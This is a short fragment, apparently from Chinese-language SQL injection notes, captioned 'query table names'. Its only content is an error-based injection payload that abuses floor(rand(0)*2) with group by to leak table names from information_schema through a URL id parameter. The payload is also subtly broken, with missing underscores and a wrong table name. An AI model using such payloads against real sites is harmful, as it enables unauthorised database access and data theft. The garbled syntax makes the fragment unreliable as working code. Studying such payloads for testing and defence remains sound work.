...
- 查表名`?id=1' and (select 1 from (select count(*),concat((select table_name from information_schema.table where table schema=database() limit 0,1),floor(rand(0)*2))x from information schema.tables group by x)a)--+`
